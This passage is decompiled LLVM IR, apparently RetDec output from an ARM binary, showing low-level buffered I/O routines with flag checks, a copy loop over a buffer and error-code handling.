  uselistorder i32* @ip, { 8, 9, 10, 63, 11, 12, 7, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 3, 97, 98, 99, 100, 101, 102, 103, 104, 105, 13, 0, 14, 15, 16, 17, 18, 106, 107, 38, 39, 4, 23, 24, 25, 26, 27, 28, 40, 41, 42, 111, 108, 109, 110, 1, 112, 22, 43, 44, 45, 46, 2, 47, 48, 49, 29, 30, 31, 50, 51, 52, 53, 19, 20, 21, 32, 33, 34, 35, 36, 37, 5, 54, 55, 56, 57, 58, 59, 60, 6, 61, 62 }
  uselistorder i1 false, { 0, 14, 15, 16, 28, 9, 13, 29, 30, 31, 32, 33, 2, 1, 17, 20, 19, 18, 21, 5, 6, 34, 35, 36, 4, 3, 7, 8, 24, 25, 26, 11, 27, 10, 12, 23, 22, 37 }
  uselistorder i32 -8, { 33, 13, 14, 15, 16, 17, 18, 12, 11, 5, 10, 9, 8, 7, 19, 20, 21, 22, 23, 35, 24, 25, 26, 27, 28, 34, 36, 29, 37, 32, 6, 30, 31, 4, 0, 1, 2, 3 }
  uselistorder i32 14, { 10, 11, 19, 7, 8, 9, 1, 2, 3, 4, 5, 12, 13, 6, 14, 15, 16, 17, 0, 18 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_15700, { 2, 0, 1 }
  uselistorder label %dec_label_pc_156e8, { 1, 0 }
}

define i32 @function_15710(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15710:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15710 = load i32, i32* @r4, align 4
  store i32 %v3_15710, i32* %stack_var_-12, align 4
  %v0_15714 = load i32, i32* %r0.global-to-local, align 4
  %v1_15714 = inttoptr i32 %v0_15714 to i16*
  %v2_15714 = load i16, i16* %v1_15714, align 2
  %v3_15714 = zext i16 %v2_15714 to i32
  %v1_15718 = and i32 %v3_15714, 4
  store i32 %v1_15718, i32* %r5.global-to-local, align 4
  %v2_15718 = icmp eq i32 %v1_15718, 0
  store i32 %v0_15714, i32* %r4.global-to-local, align 4
  br i1 %v2_15718, label %dec_label_pc_1572c, label %bb

bb:                                               ; preds = %dec_label_pc_15710
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_1572c:                               ; preds = %dec_label_pc_15710
  %v1_1572c = icmp slt i32 %arg2, 0
  br i1 %v1_1572c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1572c
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1572c, %bb18
  %v1_15734 = add i32 %v0_15714, 4
  %v2_15734 = inttoptr i32 %v1_15734 to i32*
  %v3_15734 = load i32, i32* %v2_15734, align 4
  store i32 %v3_15734, i32* %r0.global-to-local, align 4
  %v1_15738 = call i32 @function_103a0(i32 %v3_15734)
  store i32 %v1_15738, i32* %r0.global-to-local, align 4
  %v5_15740 = icmp sgt i32 %v1_15738, 0
  br i1 %v5_15740, label %.thread7, label %dec_label_pc_15744

dec_label_pc_15744:                               ; preds = %bb19
  %v2_1573c = icmp eq i32 %v1_15738, 0
  %v0_15744 = load i32, i32* %r4.global-to-local, align 4
  %v1_15744 = inttoptr i32 %v0_15744 to i16*
  %v2_15744 = load i16, i16* %v1_15744, align 2
  br i1 %v2_1573c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_15744
  %v2_15748 = or i16 %v2_15744, 4
  store i16 %v2_15748, i16* %v1_15744, align 2
  %v1_15764.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_15744
  %v2_1574c = or i16 %v2_15744, 8
  store i16 %v2_1574c, i16* %v1_15744, align 2
  %v1_15758 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_15758, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_15764 = phi i32 [ %v1_15764.pre, %bb20 ], [ 0, %bb ], [ %v1_15738, %bb19 ], [ %v1_15758, %bb21 ]
  %v2_15760 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15760, i32* @r4, align 4
  ret i32 %v1_15764

; uselistorder directives
  uselistorder i16 %v2_15744, { 1, 0 }
  uselistorder i32 %v1_15738, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @function_103a0, { 3, 1, 2, 0 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @function_15768(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15768:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_15768 = load i32, i32* @r4, align 4
  store i32 %v3_15768, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_157802 = icmp eq i32 %arg3, 0
  store i1 %v2_157802, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_157802, label %dec_label_pc_15810, label %dec_label_pc_15788

dec_label_pc_15780thread-pre-split:               ; preds = %dec_label_pc_15788
  %v3_157a0 = load i32, i32* %r6.global-to-local, align 4
  %v5_157a0 = add i32 %v3_157a0, %v3_15798
  store i32 %v5_157a0, i32* %r6.global-to-local, align 4
  %v4_157a4 = load i32, i32* %r5.global-to-local, align 4
  %v5_157a4 = sub i32 %v4_157a4, %v3_15798
  store i32 %v5_157a4, i32* %r5.global-to-local, align 4
  %v2_15780 = icmp eq i32 %v5_157a4, 0
  store i1 %v2_15780, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15780, label %dec_label_pc_15780.dec_label_pc_15810.loopexit_crit_edge, label %dec_label_pc_15780thread-pre-split.dec_label_pc_15788_crit_edge

dec_label_pc_15780thread-pre-split.dec_label_pc_15788_crit_edge: ; preds = %dec_label_pc_15780thread-pre-split
  %v3_15788.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_15794.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15788

dec_label_pc_15788:                               ; preds = %dec_label_pc_15768, %dec_label_pc_15780thread-pre-split.dec_label_pc_15788_crit_edge
  %v0_15794 = phi i32 [ %v0_15794.pre, %dec_label_pc_15780thread-pre-split.dec_label_pc_15788_crit_edge ], [ %tmp, %dec_label_pc_15768 ]
  %v0_15790 = phi i32 [ %v5_157a0, %dec_label_pc_15780thread-pre-split.dec_label_pc_15788_crit_edge ], [ %arg2, %dec_label_pc_15768 ]
  %v3_15788 = phi i32 [ %v3_15788.pre, %dec_label_pc_15780thread-pre-split.dec_label_pc_15788_crit_edge ], [ 2147483647, %dec_label_pc_15768 ]
  %v0_1578c.in = phi i32 [ %v5_157a4, %dec_label_pc_15780thread-pre-split.dec_label_pc_15788_crit_edge ], [ %arg3, %dec_label_pc_15768 ]
  %v3_1578c = phi i32 [ %v5_157a4, %dec_label_pc_15780thread-pre-split.dec_label_pc_15788_crit_edge ], [ %arg3, %dec_label_pc_15768 ]
  %v0_1578c = icmp slt i32 %v0_1578c.in, 0
  %storemerge = select i1 %v0_1578c, i32 %v3_15788, i32 %v3_1578c
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_15790, i32* %r1.global-to-local, align 4
  %v1_15794 = add i32 %v0_15794, 4
  %v2_15794 = inttoptr i32 %v1_15794 to i32*
  %v3_15794 = load i32, i32* %v2_15794, align 4
  %v3_15798 = call i32 @function_10514(i32 %v3_15794, i32 %v0_15790)
  %v1_1579c = icmp slt i32 %v3_15798, 0
  %v2_1579c = icmp eq i32 %v3_15798, 0
  store i1 %v2_1579c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_1579c, label %dec_label_pc_157ac, label %dec_label_pc_15780thread-pre-split

dec_label_pc_157ac:                               ; preds = %dec_label_pc_15788
  %v0_157ac = load i32, i32* %r4.global-to-local, align 4
  %v1_157ac = inttoptr i32 %v0_157ac to i16*
  %v2_157ac = load i16, i16* %v1_157ac, align 2
  %v3_157ac = zext i16 %v2_157ac to i32
  store i32 %v3_157ac, i32* %r3.global-to-local, align 4
  %v1_157b0 = add i32 %v0_157ac, 8
  store i32 %v1_157b0, i32* %r1.global-to-local, align 4
  %v1_157b4 = inttoptr i32 %v1_157b0 to i32*
  %v2_157b4 = load i32, i32* %v1_157b4, align 4
  store i32 %v2_157b4, i32* %r1.global-to-local, align 4
  %v3_157b4 = add i32 %v0_157ac, 12
  %v4_157b4 = inttoptr i32 %v3_157b4 to i32*
  %v5_157b4 = load i32, i32* %v4_157b4, align 4
  %v1_157b8 = or i32 %v3_157ac, 8
  store i32 %v1_157b8, i32* %r3.global-to-local, align 4
  %v2_157bc = sub i32 %v5_157b4, %v2_157b4
  store i32 %v2_157bc, i32* %r2.global-to-local, align 4
  %v9_157bc = icmp eq i32 %v5_157b4, %v2_157b4
  store i1 %v9_157bc, i1* %cpsr_z.global-to-local, align 1
  %v1_157c0 = trunc i32 %v1_157b8 to i16
  store i16 %v1_157c0, i16* %v1_157ac, align 2
  br i1 %v9_157bc, label %dec_label_pc_157ac.dec_label_pc_1580c_crit_edge, label %dec_label_pc_157c8

dec_label_pc_157ac.dec_label_pc_1580c_crit_edge:  ; preds = %dec_label_pc_157ac
  %v0_1580c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1580c

dec_label_pc_157c8:                               ; preds = %dec_label_pc_157ac
  %v0_157c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_157c8 = load i32, i32* %r5.global-to-local, align 4
  %v3_157c8 = icmp ult i32 %v0_157c8, %v1_157c8
  %v9_157c8 = icmp eq i32 %v0_157c8, %v1_157c8
  store i1 %v9_157c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_157c8, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_157c8
  store i32 %v1_157c8, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_157c8, %bb23
  %v2_157dc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_157f0
  %v2_157dc = phi i32 [ %v2_157dc.pre, %.preheader ], [ %v1_157f4, %dec_label_pc_157f0 ]
  %v0_157d0 = load i32, i32* %r6.global-to-local, align 4
  %v1_157d0 = inttoptr i32 %v0_157d0 to i8*
  %v2_157d0 = load i8, i8* %v1_157d0, align 1
  %v3_157d0 = zext i8 %v2_157d0 to i32
  store i32 %v3_157d0, i32* %r3.global-to-local, align 4
  %v7_157d4 = icmp eq i8 %v2_157d0, 10
  store i1 %v7_157d4, i1* %cpsr_z.global-to-local, align 1
  %v1_157d8 = add i32 %v0_157d0, 1
  store i32 %v1_157d8, i32* %r6.global-to-local, align 4
  %v3_157dc = inttoptr i32 %v2_157dc to i8*
  store i8 %v2_157d0, i8* %v3_157dc, align 1
  %v0_157e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_157e0, label %dec_label_pc_157e4, label %dec_label_pc_157f0

dec_label_pc_157e4:                               ; preds = %bb24
  %v0_157e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_157e4 = inttoptr i32 %v0_157e4 to i16*
  %v2_157e4 = load i16, i16* %v1_157e4, align 2
  %v3_157e4 = zext i16 %v2_157e4 to i32
  store i32 %v3_157e4, i32* %r3.global-to-local, align 4
  %v1_157e8 = and i32 %v3_157e4, 256
  %v2_157e8 = icmp eq i32 %v1_157e8, 0
  store i1 %v2_157e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_157e8, label %dec_label_pc_157f0, label %dec_label_pc_157e4.dec_label_pc_157fc_crit_edge

dec_label_pc_157e4.dec_label_pc_157fc_crit_edge:  ; preds = %dec_label_pc_157e4
  %v0_15800.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_157fc

dec_label_pc_157f0:                               ; preds = %dec_label_pc_157e4, %bb24
  %v0_157f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_157f0 = add i32 %v0_157f0, -1
  store i32 %v1_157f0, i32* %r2.global-to-local, align 4
  %v7_157f0 = icmp eq i32 %v0_157f0, 1
  store i1 %v7_157f0, i1* %cpsr_z.global-to-local, align 1
  %v0_157f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_157f4 = add i32 %v0_157f4, 1
  store i32 %v1_157f4, i32* %r1.global-to-local, align 4
  br i1 %v7_157f0, label %dec_label_pc_157f0.dec_label_pc_157fc_crit_edge, label %bb24

dec_label_pc_157f0.dec_label_pc_157fc_crit_edge:  ; preds = %dec_label_pc_157f0
  %v0_157fc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_157fc

dec_label_pc_157fc:                               ; preds = %dec_label_pc_157e4.dec_label_pc_157fc_crit_edge, %dec_label_pc_157f0.dec_label_pc_157fc_crit_edge
  %v0_15800 = phi i32 [ %v1_157f4, %dec_label_pc_157f0.dec_label_pc_157fc_crit_edge ], [ %v0_15800.pre, %dec_label_pc_157e4.dec_label_pc_157fc_crit_edge ]
  %v0_157fc = phi i32 [ %v0_157fc.pre, %dec_label_pc_157f0.dec_label_pc_157fc_crit_edge ], [ %v0_157e4, %dec_label_pc_157e4.dec_label_pc_157fc_crit_edge ]
  %v1_157fc = add i32 %v0_157fc, 8
  %v2_157fc = inttoptr i32 %v1_157fc to i32*
  %v3_157fc = load i32, i32* %v2_157fc, align 4
  store i32 %v3_157fc, i32* %r3.global-to-local, align 4
  %v2_15800 = add i32 %v0_157fc, 16
  %v3_15800 = inttoptr i32 %v2_15800 to i32*
  store i32 %v0_15800, i32* %v3_15800, align 4
  %v0_15804 = load i32, i32* %r3.global-to-local, align 4
  %v1_15804 = load i32, i32* %r1.global-to-local, align 4
  %v2_15804 = sub i32 %v1_15804, %v0_15804
  store i32 %v2_15804, i32* %r3.global-to-local, align 4
  %v1_15808 = load i32, i32* %r5.global-to-local, align 4
  %v2_15808 = sub i32 %v1_15808, %v2_15804
  store i32 %v2_15808, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1580c

dec_label_pc_1580c:                               ; preds = %dec_label_pc_157ac.dec_label_pc_1580c_crit_edge, %dec_label_pc_157fc
  %v0_1580c = phi i32 [ %v0_1580c.pre, %dec_label_pc_157ac.dec_label_pc_1580c_crit_edge ], [ %v2_15808, %dec_label_pc_157fc ]
  %v1_1580c = load i32, i32* @r7, align 4
  %v2_1580c = sub i32 %v1_1580c, %v0_1580c
  br label %dec_label_pc_15810

dec_label_pc_15780.dec_label_pc_15810.loopexit_crit_edge: ; preds = %dec_label_pc_15780thread-pre-split
  %v0_15810.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15810

dec_label_pc_15810:                               ; preds = %dec_label_pc_15768, %dec_label_pc_15780.dec_label_pc_15810.loopexit_crit_edge, %dec_label_pc_1580c
  %v0_15810 = phi i32 [ %v2_1580c, %dec_label_pc_1580c ], [ %v0_15810.pre.pre, %dec_label_pc_15780.dec_label_pc_15810.loopexit_crit_edge ], [ 0, %dec_label_pc_15768 ]
  %v2_15814 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15814, i32* %r4.global-to-local, align 4
  ret i32 %v0_15810

; uselistorder directives
  uselistorder i32 %v0_157fc, { 1, 0 }
  uselistorder i32 %v1_157f4, { 0, 2, 1 }
  uselistorder i32 %v0_157f0, { 1, 0 }
  uselistorder i32 %v1_157c8, { 0, 2, 1 }
  uselistorder i32 %v0_157c8, { 1, 0 }
  uselistorder i32 %v5_157b4, { 1, 0 }
  uselistorder i32 %v2_157b4, { 1, 0, 2 }
  uselistorder i32 %v3_15798, { 2, 3, 0, 1 }
  uselistorder i32 %v0_15790, { 1, 0 }
  uselistorder i32 %v5_157a4, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 5, 1, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 5, 4, 6, 7, 8, 0 }
  uselistorder i32 256, { 223, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 216, 224, 221, 222, 225, 35, 37, 36, 38, 214, 39, 40, 41, 0, 219, 1, 42, 43, 44, 45, 46, 48, 49, 50, 47, 52, 53, 54, 51, 55, 56, 57, 58, 226, 59, 60, 61, 62, 63, 227, 64, 65, 66, 67, 228, 68, 69, 70, 71, 72, 73, 74, 76, 75, 77, 79, 78, 80, 81, 83, 82, 84, 85, 86, 87, 94, 91, 95, 92, 96, 93, 88, 89, 90, 97, 98, 99, 100, 101, 2, 102, 3, 111, 107, 112, 108, 103, 104, 105, 113, 109, 114, 110, 106, 115, 116, 117, 118, 119, 129, 130, 124, 131, 125, 120, 121, 126, 132, 127, 133, 128, 122, 123, 134, 135, 136, 137, 142, 140, 138, 143, 141, 139, 144, 145, 147, 149, 150, 148, 146, 151, 217, 229, 152, 154, 153, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 170, 177, 171, 178, 172, 166, 167, 179, 173, 168, 174, 180, 175, 169, 176, 181, 182, 183, 184, 185, 186, 191, 198, 192, 199, 193, 187, 188, 200, 194, 189, 195, 201, 196, 190, 197, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 220, 213, 215, 230, 218, 231 }
  uselistorder i8 10, { 4, 5, 0, 6, 1, 2, 3 }
  uselistorder i32 (i32, i32)* @function_10514, { 2, 1, 0 }
  uselistorder i32 4, { 188, 189, 190, 182, 183, 313, 191, 395, 4, 5, 192, 6, 7, 76, 0, 8, 85, 80, 81, 9, 396, 82, 397, 62, 10, 11, 83, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 12, 415, 416, 417, 418, 419, 420, 61, 421, 422, 423, 424, 425, 426, 13, 14, 84, 427, 193, 99, 194, 15, 195, 100, 196, 197, 198, 199, 127, 200, 201, 202, 203, 204, 205, 16, 184, 185, 186, 187, 227, 228, 177, 178, 179, 180, 181, 428, 128, 101, 429, 17, 430, 129, 130, 63, 324, 325, 326, 327, 328, 329, 131, 132, 18, 330, 331, 332, 333, 334, 335, 336, 337, 133, 322, 323, 292, 293, 294, 295, 296, 297, 298, 299, 300, 19, 301, 302, 303, 338, 20, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 134, 135, 136, 353, 354, 357, 360, 355, 356, 102, 137, 358, 57, 359, 361, 362, 363, 365, 138, 22, 21, 364, 139, 140, 141, 208, 142, 58, 23, 24, 229, 230, 231, 232, 233, 25, 234, 366, 367, 176, 26, 27, 368, 369, 175, 28, 29, 103, 206, 64, 218, 143, 219, 59, 30, 220, 221, 31, 222, 65, 77, 104, 223, 224, 278, 209, 207, 210, 211, 212, 213, 75, 74, 73, 214, 105, 32, 33, 34, 35, 36, 37, 215, 67, 66, 216, 68, 106, 38, 39, 40, 217, 69, 107, 108, 109, 144, 225, 110, 226, 235, 236, 145, 237, 238, 146, 147, 239, 86, 240, 87, 148, 149, 150, 241, 242, 111, 88, 243, 244, 151, 245, 246, 247, 152, 153, 1, 112, 248, 89, 249, 250, 251, 154, 252, 253, 155, 156, 2, 113, 254, 90, 255, 91, 256, 257, 258, 259, 157, 260, 261, 158, 159, 262, 263, 114, 264, 3, 265, 92, 266, 115, 267, 268, 269, 270, 271, 160, 272, 273, 161, 162, 117, 274, 116, 275, 93, 276, 94, 277, 279, 280, 281, 282, 283, 119, 284, 120, 285, 163, 286, 60, 287, 164, 165, 121, 288, 118, 289, 95, 290, 96, 291, 166, 41, 304, 167, 42, 305, 168, 43, 306, 169, 44, 307, 170, 45, 308, 309, 171, 46, 310, 172, 47, 311, 173, 48, 312, 370, 314, 315, 316, 317, 318, 319, 320, 174, 321, 371, 372, 373, 97, 374, 78, 375, 376, 377, 378, 98, 379, 122, 380, 381, 382, 79, 383, 123, 384, 49, 50, 51, 52, 53, 385, 386, 387, 54, 72, 71, 70, 388, 55, 56, 124, 389, 125, 390, 391, 392, 126, 393, 394 }
  uselistorder i32 2147483647, { 1, 6, 0, 2, 3, 4, 5 }
  uselistorder i32* @r7, { 2, 32, 33, 21, 22, 23, 24, 25, 26, 27, 28, 31, 3, 34, 35, 36, 4, 37, 38, 39, 16, 40, 41, 5, 42, 43, 44, 45, 46, 47, 6, 48, 49, 50, 51, 52, 53, 29, 30, 317, 318, 239, 240, 241, 242, 20, 319, 320, 321, 326, 327, 7, 54, 55, 8, 95, 96, 97, 0, 98, 243, 244, 245, 246, 247, 248, 249, 250, 251, 196, 197, 198, 199, 200, 201, 252, 253, 254, 255, 256, 257, 258, 259, 9, 260, 261, 262, 263, 264, 265, 266, 267, 268, 99, 100, 70, 71, 269, 270, 158, 159, 72, 73, 112, 113, 114, 115, 116, 121, 122, 123, 124, 125, 117, 118, 119, 120, 126, 127, 128, 129, 130, 131, 271, 272, 324, 325, 74, 75, 76, 77, 273, 274, 322, 323, 132, 133, 134, 135, 78, 79, 233, 234, 101, 102, 275, 276, 277, 278, 279, 136, 137, 138, 139, 140, 280, 281, 18, 282, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 85, 86, 87, 88, 89, 90, 80, 81, 82, 83, 84, 91, 92, 93, 94, 103, 104, 10, 105, 106, 107, 108, 109, 110, 111, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 11, 151, 152, 153, 154, 155, 156, 157, 13, 12, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 19, 173, 174, 175, 176, 177, 178, 179, 1, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 223, 221, 222, 17, 224, 225, 226, 227, 228, 229, 230, 231, 232, 235, 236, 237, 238, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 14, 307, 308, 309, 310, 311, 312, 313, 314, 15, 315, 316 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_15810, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1580c, { 1, 0 }
  uselistorder label %dec_label_pc_157fc, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15788, { 1, 0 }
}

define i32 @function_1581c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1581c:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1581c = load i32, i32* @r4, align 4
  store i32 %v3_1581c, i32* %stack_var_-8, align 4
  %v1_15820 = add i32 %arg1, 8
  %v1_15824 = inttoptr i32 %v1_15820 to i32*
  %v2_15824 = load i32, i32* %v1_15824, align 4
  %v3_15824 = add i32 %arg1, 12
  %v4_15824 = inttoptr i32 %v3_15824 to i32*
  %v5_15824 = load i32, i32* %v4_15824, align 4
  %v2_15828 = sub i32 %v5_15824, %v2_15824
  store i32 %v2_15828, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_15830 = inttoptr i32 %arg1 to i16*
  %v4_15830 = call i32 @function_15710(i16* %v3_15830, i32 %v2_15824, i32 %v2_15828)
  %v0_15834 = load i32, i32* @r4, align 4
  %v1_15834 = add i32 %v0_15834, 8
  %v2_15834 = inttoptr i32 %v1_15834 to i32*
  %v3_15834 = load i32, i32* %v2_15834, align 4
  store i32 %v3_15834, i32* %r2.global-to-local, align 4
  %v2_15838 = add i32 %v3_15834, %v4_15830
  %v2_1583c = add i32 %v0_15834, 20
  %v3_1583c = inttoptr i32 %v2_1583c to i32*
  store i32 %v2_15838, i32* %v3_1583c, align 4
  %v0_15840 = load i32, i32* %r2.global-to-local, align 4
  %v1_15840 = load i32, i32* @r4, align 4
  %v2_15840 = add i32 %v1_15840, 16
  %v3_15840 = inttoptr i32 %v2_15840 to i32*
  store i32 %v0_15840, i32* %v3_15840, align 4
  %v2_15844 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15844, i32* @r4, align 4
  ret i32 %v4_15830

; uselistorder directives
  uselistorder i32 %v4_15830, { 1, 0 }
  uselistorder i32 20, { 22, 87, 3, 88, 89, 1, 90, 23, 6, 24, 25, 26, 27, 21, 29, 30, 17, 18, 19, 20, 91, 7, 92, 74, 75, 82, 2, 31, 8, 32, 33, 0, 28, 34, 35, 9, 36, 37, 38, 39, 40, 41, 42, 43, 10, 44, 45, 46, 47, 48, 49, 50, 51, 11, 52, 53, 54, 55, 56, 57, 12, 58, 59, 13, 60, 61, 62, 63, 64, 4, 65, 14, 66, 67, 68, 69, 5, 70, 15, 71, 72, 73, 76, 77, 78, 79, 80, 81, 83, 84, 85, 16, 86 }
  uselistorder i32 12, { 10, 11, 36, 12, 13, 39, 7, 133, 134, 135, 136, 137, 139, 140, 138, 141, 142, 143, 144, 145, 146, 147, 14, 15, 16, 17, 19, 18, 20, 40, 41, 21, 42, 43, 44, 45, 46, 37, 38, 51, 52, 33, 34, 35, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 3, 79, 80, 81, 82, 83, 22, 84, 102, 23, 24, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 121, 114, 115, 116, 117, 118, 119, 120, 122, 123, 25, 124, 5, 53, 54, 26, 55, 56, 8, 47, 6, 48, 49, 50, 4, 27, 28, 29, 30, 74, 57, 58, 59, 60, 31, 61, 62, 63, 32, 64, 65, 66, 67, 68, 69, 9, 70, 71, 72, 73, 75, 76, 77, 78, 0, 1, 2, 125, 126, 127, 128, 129, 131, 130, 132 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @function_1584c() local_unnamed_addr {
dec_label_pc_1584c:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1584c = load i32, i32* @r4, align 4
  store i32 %v3_1584c, i32* %stack_var_-12, align 4
  %v0_15850 = load i32, i32* @r0, align 4
  %v1_15850 = inttoptr i32 %v0_15850 to i16*
  %v2_15850 = load i16, i16* %v1_15850, align 2
  %v3_15850 = zext i16 %v2_15850 to i32
  store i32 %v3_15850, i32* %r3.global-to-local, align 4
  %v0_15854 = load i32, i32* @r1, align 4
  %v2_15854 = and i32 %v0_15854, %v3_15850
  %v4_15854 = icmp eq i32 %v2_15854, 0
  store i32 %v0_15850, i32* @r4, align 4
  br i1 %v4_15854, label %dec_label_pc_15864, label %dec_label_pc_15874

dec_label_pc_15864:                               ; preds = %dec_label_pc_1584c
  %v1_15864 = and i32 %v3_15850, 2176
  %v2_15864 = icmp eq i32 %v1_15864, 0
  br i1 %v2_15864, label %dec_label_pc_1586c, label %dec_label_pc_15880

dec_label_pc_1586c:                               ; preds = %dec_label_pc_15864
  %v2_1586c = or i32 %v0_15854, %v3_15850
  store i32 %v2_1586c, i32* %r3.global-to-local, align 4
  %v1_15870 = trunc i32 %v2_1586c to i16
  store i16 %v1_15870, i16* %v1_15850, align 2
  %v0_15874.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15874

dec_label_pc_15874:                               ; preds = %dec_label_pc_1584c, %dec_label_pc_1586c
  %v0_15874 = phi i32 [ %v0_15850, %dec_label_pc_1584c ], [ %v0_15874.pre, %dec_label_pc_1586c ]
  %v1_15874 = inttoptr i32 %v0_15874 to i16*
  %v2_15874 = load i16, i16* %v1_15874, align 2
  %v3_15874 = zext i16 %v2_15874 to i32
  store i32 %v3_15874, i32* %r3.global-to-local, align 4
  %v1_15878 = and i32 %v3_15874, 16
  store i32 %v1_15878, i32* %r5.global-to-local, align 4
  %v2_15878 = icmp eq i32 %v1_15878, 0
  br i1 %v2_15878, label %dec_label_pc_158a0, label %dec_label_pc_15880

dec_label_pc_15880:                               ; preds = %dec_label_pc_15864, %dec_label_pc_15874
  %v0_15880 = call i32 @function_10a30()
  store i32 %v0_15880, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_15888 = inttoptr i32 %v0_15880 to i32*
  store i32 9, i32* %v2_15888, align 4
  br label %dec_label_pc_1588c

